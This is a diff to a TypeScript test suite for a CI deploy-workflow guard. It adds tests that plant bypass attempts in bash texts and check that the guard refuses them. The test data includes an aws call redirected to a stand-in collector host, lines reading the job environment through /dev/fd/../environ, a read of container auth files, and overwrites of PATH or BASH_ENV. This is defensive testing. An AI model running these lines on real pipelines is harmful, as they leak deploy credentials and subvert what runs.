@@ -111,6 +111,7 @@ import {
   TOOL_LINE_TEXTS,
   timeoutAndGroupFindings,
   triggerFindings,
+  wordSplits,
 } from './deploy-workflow.ts'
 import { moduleImports } from './imports.ts'
 import { readRepoFile, repoFiles, root } from './repo-files.ts'
@@ -4351,6 +4352,7 @@ describe('DPW-10 (C11-D48, C11-D76): no repository code where the credentials ar
     for (const text of [
       'n=0\nn=$((n + 1))',
       `echo "\${a[0]}"`,
+      // (Its name evaluates nothing from outside; a name built so is canonicalToolLines()' to refuse.)
       `for kind in a b; do printf -v "\${kind^^}_X" %s 1; done`,
       'while IFS= read -r name; do :; done <<<"$x"',
       `IFS=$'\\t' read -r path key <<<"$x"`,
@@ -8095,7 +8097,7 @@ describe('Round 7, attack 2: the ways past the allowlist (DPW-02, DPW-10, DPW-11
     "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs"
   const commands = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${COMMANDS}`
   const tools = (name: string, line: number) =>
-    `${GUARD}: DPW-10 ${name}, line ${line}: hands jq and gh only their held flags and a program written on the line, and the tools that could run a program or write a file only their lines as written`
+    `${GUARD}: DPW-10 ${name}, line ${line}: hands jq and gh only their held flags and a program written on the line, printf a single-quoted format and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line`
 
   // FETCH-A2-01: a held tool's line is held with its environment. An export before CLI_FETCH's tar (or
   // IMAGE_CHECK's) handed tar options from TAR_OPTIONS, a checkpoint action among them, on a line the guard
@@ -8370,4 +8372,191 @@ describe('Round 7, attack 2: the ways past the allowlist (DPW-02, DPW-10, DPW-11
       ),
     ).toContain(at('DPW-08', 'prod-plan (Diff the rollback)', PINNED_08))
   }, 60_000)
+})
+
+describe('Round 7, attack 3: the ways past the allowlist (DPW-07, DPW-10)', () => {
+  const TOOLS =
+    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
+  const tools = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${TOOLS}`
+  const COMMANDS =
+    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs"
+  const commands = (name: string, line: number) => `${GUARD}: DPW-10 ${name}, line ${line}: ${COMMANDS}`
+  // A canonical text with one line replaced, or added before one, and the 1-based line the change stands on.
+  const replaced = (text: string, from: string, to: string) => {
+    expect(text.split('\n').filter(each => each.trim() === from.trim())).toHaveLength(1)
+    const lines = text.split('\n').map(each => (each.trim() === from.trim() ? each.replace(from.trim(), to) : each))
+    return { planted: lines.join('\n'), line: lines.findIndex(each => each.includes(to)) + 1 }
+  }
+  const before = (text: string, anchor: string, added: string) => {
+    expect(text).toContain(anchor)
+    const planted = text.replace(anchor, `${added}\n${anchor}`)
+    return { planted, line: planted.split('\n').indexOf(added) + 1 }
+  }
+
+  // FETCH-A3-01: an aws line inside a canonical text was never read for its options (awsIsHeld read only a
+  // run's own lines), so AWS_CHECK's ECR read could send the deploy role's signed request to another host and
+  // trust its answer. A canonical text's aws is now held to its calls and options as the guard writes them.
+  it("holds a canonical text's aws to the calls and options the workflow uses (FETCH-A3-01)", () => {
+    const ecr = `tags=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageDigest=$2" --query 'imageDetails[0].imageTags' --output json) || return 1`
+    const endpoint = replaced(
+      AWS_CHECK,
+      ecr,
+      ecr.replace(" --query 'imageDetails", " --endpoint-url https://collector.invalid.example/ --query 'imageDetails"),
+    )
+    // (A planted copy of a text that evaluates is no canonical text, so readsAsBash() names it too.)
+    expect(canonicalTextFindings({ AWS_CHECK: endpoint.planted })).toContain(tools('AWS_CHECK', endpoint.line))
+    const ended = `ended=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$task" --query 'tasks[0].{exit: containers[0].exitCode, stop: stopCode}' --output json)`
+    const unverified = replaced(ONE_OFF, ended, ended.replace(' --output json', ' --no-verify-ssl --output json'))
+    expect(canonicalTextFindings({ ONE_OFF: unverified.planted })).toContain(tools('ONE_OFF', unverified.line))
+    for (const line of [
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --ca-bundle x.pem --output json)',
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --profile other --output json)',
+      'run aws ecs wait tasks-stopped --cluster "$CLUSTER" --tasks "$task" --debug',
+      `x=$(get aws ecs describe-tasks --cluster "$CLUSTER" '--endpoint-url' https://x.example --output json)`,
+      'x=$(get aws ecs describe-tasks --cli-input-json file://x.json)',
+      'x=$(get aws ecs describe-tasks --cluster file:///dev/fd/../environ --output json)',
+      'x=$(get aws ecr describe-images --repository-name hearth-server --image-ids "imageTag@=x" --output json)',
+      // An expansion bash splits could hand aws an option as it runs.
+      'x=$(get aws ecs describe-tasks --cluster $CLUSTER --tasks "$task" --output json)',
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks {a,b} --output json)',
+      // A value of more than one word but PROBE's task list could be an option as it runs.
+      'x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$@" --output json)',
+      `x=$(get aws ecs describe-tasks --cluster "$CLUSTER" --tasks "$\{tasks[@]}" --output json)`,
+      // The registry password is only the push's own line's, and a call the workflow doesn't make is refused.
+      'x=$(get aws ecr get-login-password --region ap-southeast-1)',
+      'run aws s3 cp x y',
+      'x=$(get aws "ecs" describe-tasks --cluster "$CLUSTER")',
+      // A value after a flag that takes none.
+      'x=$(get aws logs get-log-events --log-group-name "/x" --start-from-head https://x.example)',
+    ]) {
+      expect(canonicalToolLines(line), line).toEqual([0])
+    }
+    // What the texts hold passes: every option the one-offs, the log read and the read-backs use.
+    for (const text of [ONE_OFF, AWS_CHECK, TASKS_OUTPUTS, PROBE, RESTORE_DOWN])
+      expect(canonicalToolLines(text)).toEqual([])
+  })
+
+  // COMMANDS-A3-01: grep, wc, readlink and realpath in a canonical text were held by name alone, so a grep added
+  // to AWS_CHECK read the job's environment by /dev/fd/../environ (no literal /proc/) and printed it in pieces
+  // no mask joins. Every program a canonical text runs is now held by what it is handed: a rule, or its line
+  // as the guard writes it; and a file is read by a redirection only on such a line.
+  it('holds every program a canonical text runs by what it is handed, and every file it reads (COMMANDS-A3-01)', () => {
+    const environ = before(
+      AWS_CHECK,
+      '  echo \'go=true\' >>"$GITHUB_OUTPUT"',
+      "  grep -aoE '[^=]{1,12}' /dev/fd/../environ || true",
+    )
+    expect(canonicalTextFindings({ AWS_CHECK: environ.planted })).toContain(tools('AWS_CHECK', environ.line))
+    for (const line of [
+      // Each plain tool off its held line.
+      "grep -aoE '.{1,12}' /dev/fd/../environ || true",
+      'x=$(wc -c /dev/fd/../environ)',
+      'x=$(readlink -f /dev/fd)',
+      'x=$(realpath -m -- /dev/fd/..)',
+      'x=$(printf \'%s\\n\' "$y" | sort -o "$z" -u)',
+      'git -c core.fsmonitor=x merge-base --is-ancestor "$1" "$2"',
+      "node -e 'process.exit(0)' infra/scripts/deploy/history.ts",
+      'sleep "$x"',
+      'x=$(mktemp -p /tmp)',
+      'cd /dev/fd/..',
+      // A file read by a redirection, by any builtin, off a held line.
+      'IFS= read -r x </dev/fd/../environ || true',
+      'echo "$(</dev/fd/../environ)"',
+      ': <"$RUNNER_TEMP/x"',
+      'mapfile -t x <"$y"',
+      'echo "$(( 1 < 2 ))"',
+      // tee to a file but the summary.
+      'printf \'%s\\n\' x | tee -a "$GITHUB_STEP_SUMMARY" "$RUNNER_TEMP/x"',
+      // jq's data from outside the assembly's or the temp folder, a .. part, or a word bash splits.
+      'x=$(jq -r . /dev/fd/../environ)',
+      `x=$(jq -r '.auths' "$XDG_RUNTIME_DIR/containers/auth.json")`,
+      `x=$(jq -r '.a' "$dir/../x.json")`,
+      `x=$(jq -r '.a' $f)`,
+      `x=$(jq -r '.a' "$HOME/x.json")`,
+      `x=$(jq -r '.a' "$\{files[@]}")`,
+      `x=$(jq -n --arg x "$@" '$x')`,
+    ]) {
+      expect(canonicalToolLines(line), line).toEqual([0])
+    }
+    // A read from a here-string, a process substitution or /dev/null, and a line the guard writes, pass.
+    for (const line of [
+      `x=$(jq -r '.a' <<<"$y")`,
+      `while IFS= read -r x; do :; done < <(jq -r '.a' "$dir/manifest.json")`,
+      'IFS= read -r x </dev/null || true',
+      'tee -a "$GITHUB_STEP_SUMMARY" <"$RUNNER_TEMP/prod-gate-ignored.txt" >&2',
+      `x=$(jq -r '.a' "$RUNNER_TEMP/records/x.json" "$\{stackfiles[@]}" infra/package.json)`,
+    ]) {
+      expect(canonicalToolLines(line), line).toEqual([])
+    }
+    // Every command CANONICAL_COMMANDS names is held one way or another: a held tool's line stands whole in its
+    // text, and no committed text's line is off its hold.
+    for (const [line, text] of TOOL_LINE_TEXTS())
+      expect(
+        text.split('\n').some(each => each.trim() === line),
+        line,
+      ).toBe(true)
+    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(canonicalToolLines(text), name).toEqual([])
+    expect(wordSplits('"$a"')).toBe(false)
+    expect(wordSplits(`"$(jq -r .a <<<"$b")"`)).toBe(false)
+    expect(wordSplits("'*'")).toBe(false)
+    expect(wordSplits('$a')).toBe(true)
+    expect(wordSplits('x$(y)')).toBe(true)
+    expect(wordSplits('*.json')).toBe(true)
+    expect(wordSplits('{a,b}')).toBe(true)
+  })
+
+  // DPW-07's second layer: the environment through /dev/fd (or /dev/stdin, /dev/stdout, /dev/stderr) is a /proc
+  // file as much as /proc/self/environ is.
+  it('finds the environment read through /dev/fd in a credentialed run (COMMANDS-A3-01)', () => {
+    const PRINTS =
+      'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
+    const readBack = 'nonprod (Read back what runs)'
+    const added = (line: string) =>
+      maskingFindings(
+        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
+      )
+    for (const line of ['cat /dev/fd/../environ | mask', 'cat /dev/stdout/../../environ | mask', 'cat /proc | mask']) {
+      expect(added(line), line).toEqual([`${DEPLOY}: DPW-07 ${readBack}: ${PRINTS}`])
+    }
+  })
+
+  // FLOW-A3-01: printf -v with a name built from an expansion ("${kind^^}_TD") set a name no rule that reads
+  // assignments saw, so a text could set X=0, overwrite X from a Tasks output that way and evaluate X. A
+  // canonical text's printf -v now takes a plain name, TASKS_OUTPUTS sets each kind's definition by name, and
+  // no builtin's name is one that chooses what runs.
+  it("holds every name a canonical text's builtins set to a plain word, never a loader's (FLOW-A3-01)", () => {
+    // The attackers' plant: two names set to 0, one overwritten by a computed printf -v, then evaluated.
+    const local = '  local outputs kind definition\n'
+    const anchor = `    definition=$(output "$\{kind^}TaskDefinition")\n`
+    const computed = `    printf -v "$\{kind^^}_REVISION" '%s' "$\{definition##*:}"`
+    expect(TASKS_OUTPUTS).toContain(local)
+    expect(TASKS_OUTPUTS).toContain(anchor)
+    const planted = TASKS_OUTPUTS.replace(
+      local,
+      '  local outputs kind definition MIGRATE_REVISION=0 PROBE_REVISION=0\n',
+    ).replace(
+      anchor,
+      `${anchor}${computed}\n    if [ "$(( 999999 < MIGRATE_REVISION + PROBE_REVISION ))" = 1 ]; then\n      exit 1\n    fi\n`,
+    )
+    expect(canonicalTextFindings({ TASKS_OUTPUTS: planted })).toContain(
+      tools('TASKS_OUTPUTS', planted.split('\n').indexOf(computed) + 1),
+    )
+    expect(canonicalToolLines(`for k in n; do\n  printf -v "$k" '%s' 1\ndone`)).toEqual([1])
+    // TASKS_OUTPUTS sets each kind's definition by its name.
+    expect(TASKS_OUTPUTS).not.toContain('printf -v')
+    expect(TASKS_OUTPUTS).toContain(`migrate) MIGRATE_TD="$\{definition##*/}" ;;`)
+    expect(TASKS_OUTPUTS).toContain(`probe) PROBE_TD="$\{definition##*/}" ;;`)
+    expect(canonicalToolLines(`printf -v "x" '%s' 1`)).toEqual([0])
+    // A name read, mapfile, printf -v or a for loop sets is never PATH, HOME, BASH_ENV or another loader's.
+    for (const text of [
+      'read -r PATH <<<"$x"',
+      `printf -v PATH '%s' "$RUNNER_TEMP/bin"`,
+      'for HOME in x; do :; done',
+      'mapfile -t BASH_ENV < <(echo x)',
+      'IFS= read -r x NODE_OPTIONS <<<"$y"',
+    ]) {
+      expect(canonicalTextFindings({ X: text }), text).toContain(commands('X', 1))
+    }
+    expect(canonicalCommandLines(`printf -v X '%s' 1`, new Set())).toEqual([])
+  })
 })
